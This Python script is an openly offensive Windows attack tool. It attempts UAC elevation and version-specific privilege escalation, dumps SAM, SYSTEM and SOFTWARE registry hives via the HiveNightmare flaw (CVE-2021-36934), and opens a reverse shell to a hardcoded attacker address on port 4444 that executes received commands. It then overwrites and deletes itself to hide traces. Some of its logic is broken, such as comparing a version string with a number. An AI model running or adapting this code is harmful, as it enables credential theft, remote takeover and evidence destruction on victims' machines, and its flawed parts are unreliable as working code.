import os
import platform
import ctypes
import shutil
import subprocess
import socket
import sys
from pathlib import Path
from time import sleep
import time
import tkinter as tk
from tkinter import messagebox


def secure_delete(file_path=os.path.realpath(__file__), passes=5):
    """
    Securely delete the file by overwriting it with random data before deletion.
    Clears system memory cache to ensure residual data in RAM is also minimized.

    :param file_path: Path to the file to be securely deleted.
    :param passes: Number of times to overwrite the file (default is 5).
    """
    try:
        file_size = os.path.getsize(file_path)
        with open(file_path, 'r+b') as file:
            for _ in range(passes):
                file.seek(0)
                file.write(os.urandom(file_size))
        os.remove(file_path)
        print(f'{file_path} securely deleted.')
        clear_system_cache()
    except Exception as e:
        print(f'Error: {e}')


def clear_system_cache():
    """
    Clear the system's memory cache to minimize traces in memory.
    Uses OS-specific commands.
    """
    try:
        os_type = platform.system()
        if os_type == 'Linux':
            os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
            print('Linux system memory cache cleared.')
        elif os_type == 'Windows':
            ctypes.windll.kernel32.SetSystemFileCacheSize(0, 0, 0)
            ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1)
            print('Windows system memory cache cleared.')
        else:
            print(f'Cache clearing not supported for OS: {os_type}')
        time.sleep(1)
    except Exception as e:
        print(f'Error clearing system cache: {e}')


def on_close(root):
    """
    Function to be called when the popup is closed.
    """
    script_path = os.path.realpath(__file__)
    secure_delete(script_path, passes=3)
    root.destroy()


def dest_poc_main():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo('Hello',
        'Hello, this script will delete itself after you close this message.')
    root.after(0, on_close, root)
    root.mainloop()


def call_main():
    sys.exit(int(dest_poc_main() or 0))


def check_admin_privileges():
    """
    Check if the script is running with admin privileges.
    Returns True if admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def elevate_privileges():
    """
    Attempt to elevate privileges by re-running the script with admin rights.
    UAC prompt will appear for privilege escalation.
    """
    try:
        if not check_admin_privileges():
            print('[*] Attempting to elevate privileges via UAC...')
            ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.
                executable, ' '.join(sys.argv), None, 1)
            sleep(3)
            if check_admin_privileges():
                print('[+] Privileges elevated successfully.')
            else:
                print('[-] Privilege escalation failed.')
    except Exception as e:
        print(f'[-] Privilege escalation failed: {e}')


def detect_windows_version():
    """
    Detect the Windows version.
    """
    version = platform.release()
    print(f'[*] Detected Windows version: {version}')
    return version


def hive_nightmare_dump(path=None):
    """PoC for CVE-2021-36934 to dump SAM, SYSTEM, and SOFTWARE hives."""
    username = os.getlogin()
    if not path:
        path = Path(f'C:/Users/{username}/Desktop')
    path = Path(path)
    path.mkdir(parents=True, exist_ok=True)
    if detect_windows_version() < 17763:
        print('[-] System not susceptible to CVE-2021-36934')
        return
    else:
        print('[+] System is a vulnerable version of Windows')
    out_sam = path / 'Sam.hive'
    out_soft = path / 'Soft.hive'
    out_sys = path / 'Sys.hive'
    success = False
    for i in range(1, 10):
        try:
            src_sam = (
                f'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\sam'
                )
            shutil.copy(src_sam, f'{out_sam}{i}')
            print(f'[+] Dumping SAM{i} hive...')
            success = True
        except Exception:
            pass
        try:
            src_soft = (
                f'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\software'
                )
            shutil.copy(src_soft, f'{out_soft}{i}')
            print(f'[+] Dumping SOFTWARE{i} hive...')
            success = True
        except Exception:
            pass
        try:
            src_sys = (
                f'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\system'
                )
            shutil.copy(src_sys, f'{out_sys}{i}')
            print(f'[+] Dumping SYSTEM{i} hive...')
            success = True
        except Exception:
            pass
    if success:
        print(f'[+] Hives are dumped to {path}')
    else:
        print('[-] There are no accessible Volume Shadow Copies on this system'
            )


def windows_xp_escalation():
    """
    Example escalation for Windows XP.
    Exploit legacy service vulnerabilities, misconfigurations, etc.
    """
    print('[*] Running Windows XP specific escalation...')
    if check_admin_privileges():
        os.system('net user admin /active:yes')
        print('[+] Admin account enabled on Windows XP.')
    else:
        print('[-] Insufficient privileges for XP escalation.')


def windows_7_escalation():
    """
    Example escalation for Windows 7.
    Token manipulation, UAC bypass, or known exploits (e.g., MS10-092).
    """
    print('[*] Running Windows 7 specific escalation...')
    if check_admin_privileges():
        os.system(
            'schtasks /create /tn escalatetask /tr C:\\Windows\\System32\\cmd.exe /sc onlogon /rl highest'
            )
        print('[+] Scheduled high-privileged task created for Windows 7.')
    else:
        print('[-] Insufficient privileges for Windows 7 escalation.')


def windows_10_escalation():
    """
    Example escalation for Windows 10.
    Use techniques like PowerShell to try privilege escalation.
    """
    print('[*] Running Windows 10 specific escalation...')
    try:
        if check_admin_privileges():
            subprocess.run(['powershell.exe',
                'Start-Process cmd.exe -Verb runAs'], check=True)
            print('[+] Elevated command launched in Windows 10.')
        else:
            print('[-] Insufficient privileges for Windows 10 escalation.')
    except Exception as e:
        print(f'[-] Windows 10 escalation failed: {e}')


def windows_11_escalation():
    """
    Privilege escalation for Windows 11 using HiveNightmare vulnerability (CVE-2021-36934).
    """
    print('[*] Running Windows 11 specific escalation using HiveNightmare...')
    if check_admin_privileges():
        try:
            hive_nightmare_dump()
        except Exception as e:
            print(f'[-] Windows 11 escalation failed: {e}')
    else:
        print('[-] Insufficient privileges for Windows 11 escalation.')


def privilege_escalation():
    """
    Based on the detected Windows version, attempt the appropriate privilege escalation method.
    """
    windows_version = detect_windows_version()
    if windows_version == 'XP':
        windows_xp_escalation()
    elif windows_version == '7':
        windows_7_escalation()
    elif windows_version in ['8', '8.1']:
        windows_7_escalation()
    elif windows_version == '10':
        windows_10_escalation()
    elif windows_version == '11':
        if detect_windows_version() < 17763:
            print('[-] System not susceptible to CVE-2021-36934')
        else:
            print('[+] System is a vulnerable version of Windows')
            windows_11_escalation()
    else:
        print('[-] Unsupported Windows version or not detected.')


def establish_reverse_shell():
    """
    Connect to the attacker's machine to establish a reverse shell.
    """
    attacker_ip = '192.168.65.132'
    attacker_port = 4444
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        s.send(b"[+] Connection established! Type 'exit' to end session.\n")
        while True:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            s.send(result if result else b'[+] Command executed, no output.\n')
    except Exception as e:
        print(f'[-] Reverse shell failed: {e}')
    finally:
        s.close()


def main():
    try:
        print('[*] Starting automated privilege escalation...')
        if check_admin_privileges():
            print('[+] Running with administrator privileges!')
            establish_reverse_shell()
        else:
            print(
                '[*] Not running as admin, attempting privilege escalation...')
            elevate_privileges()
            sleep(3)
            if check_admin_privileges():
                privilege_escalation()
                establish_reverse_shell()
            else:
                print('[-] Failed to obtain administrator privileges.')
    except KeyboardInterrupt:
        print('Closing shell')


if __name__ == '__main__':
    main()
    secure_delete()
